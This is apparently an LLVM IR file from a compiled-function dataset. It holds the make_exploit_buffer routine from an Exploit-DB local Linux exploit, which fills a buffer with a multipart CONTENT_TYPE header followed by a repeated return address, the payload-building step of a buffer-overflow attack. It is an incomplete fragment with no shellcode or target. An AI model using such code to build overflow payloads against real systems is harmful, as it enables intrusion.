; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22128.c_make_exploit_buffer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_22128.c_make_exploit_buffer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@egg = common dso_local global i8* null, align 8
@EGG_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [43 x i8] c"CONTENT_TYPE=multipart/form-data boundary=\00", align 1
@CONTENT_LENGTH = common dso_local global i32 0, align 4
@RET_ADDR = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @make_exploit_buffer() #0 {
  %1 = alloca i32, align 4
  %2 = load i8*, i8** @egg, align 8
  %3 = load i32, i32* @EGG_SIZE, align 4
  %4 = sub nsw i32 %3, 1
  %5 = call i32 @memset(i8* %2, i32 0, i32 %4)
  %6 = load i8*, i8** @egg, align 8
  %7 = load i32, i32* @CONTENT_LENGTH, align 4
  %8 = call i32 @memcpy(i8* %6, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0), i32 %7)
  store i32 0, i32* %1, align 4
  br label %9

9:                                                ; preds = %56, %0
  %10 = load i32, i32* %1, align 4
  %11 = load i32, i32* @EGG_SIZE, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %59

13:                                               ; preds = %9
  %14 = load i32, i32* @RET_ADDR, align 4
  %15 = and i32 %14, 255
  %16 = trunc i32 %15 to i8
  %17 = load i8*, i8** @egg, align 8
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @CONTENT_LENGTH, align 4
  %20 = add nsw i32 %18, %19
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %17, i64 %21
  store i8 %16, i8* %22, align 1
  %23 = load i32, i32* @RET_ADDR, align 4
  %24 = ashr i32 %23, 8
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  %27 = load i8*, i8** @egg, align 8
  %28 = load i32, i32* %1, align 4
  %29 = load i32, i32* @CONTENT_LENGTH, align 4
  %30 = add nsw i32 %28, %29
  %31 = add nsw i32 %30, 1
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %27, i64 %32
  store i8 %26, i8* %33, align 1
  %34 = load i32, i32* @RET_ADDR, align 4
  %35 = ashr i32 %34, 16
  %36 = and i32 %35, 255
  %37 = trunc i32 %36 to i8
  %38 = load i8*, i8** @egg, align 8
  %39 = load i32, i32* %1, align 4
  %40 = load i32, i32* @CONTENT_LENGTH, align 4
  %41 = add nsw i32 %39, %40
  %42 = add nsw i32 %41, 2
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i8, i8* %38, i64 %43
  store i8 %37, i8* %44, align 1
  %45 = load i32, i32* @RET_ADDR, align 4
  %46 = ashr i32 %45, 24
  %47 = and i32 %46, 255
  %48 = trunc i32 %47 to i8
  %49 = load i8*, i8** @egg, align 8
  %50 = load i32, i32* %1, align 4
  %51 = load i32, i32* @CONTENT_LENGTH, align 4
  %52 = add nsw i32 %50, %51
  %53 = add nsw i32 %52, 3
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %49, i64 %54
  store i8 %48, i8* %55, align 1
  br label %56

56:                                               ; preds = %13
  %57 = load i32, i32* %1, align 4
  %58 = add nsw i32 %57, 4
  store i32 %58, i32* %1, align 4
  br label %9

59:                                               ; preds = %9
  %60 = load i8*, i8** @egg, align 8
  %61 = load i32, i32* @EGG_SIZE, align 4
  %62 = load i32, i32* @CONTENT_LENGTH, align 4
  %63 = add nsw i32 %61, %62
  %64 = sub nsw i32 %63, 1
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %60, i64 %65
  store i8 0, i8* %66, align 1
  ret void
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
